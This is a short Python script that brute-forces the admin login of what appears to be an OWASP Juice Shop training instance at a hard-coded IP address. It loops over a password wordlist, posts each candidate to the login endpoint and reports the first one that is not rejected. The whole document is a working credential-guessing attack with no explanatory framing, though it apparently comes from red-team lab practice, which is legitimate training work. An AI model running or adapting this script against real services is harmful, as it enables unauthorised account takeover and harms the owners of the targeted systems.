import requests
with open("/home/client01/Área de trabalho/SetupRedTeam/wordlists/wordlists/passwords/password.txt", "r") as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    data = {"email": "admin@juice-sh.op", "password": password}
    response = requests.post( "http://98.81.71.8/rest/user/login",json=data )
    code = response.status_code
    print ("{} - {}". format(password, code))
    if code != 401:
        print("[ + ] PASSWORD FOUND {}".format(password))
        break
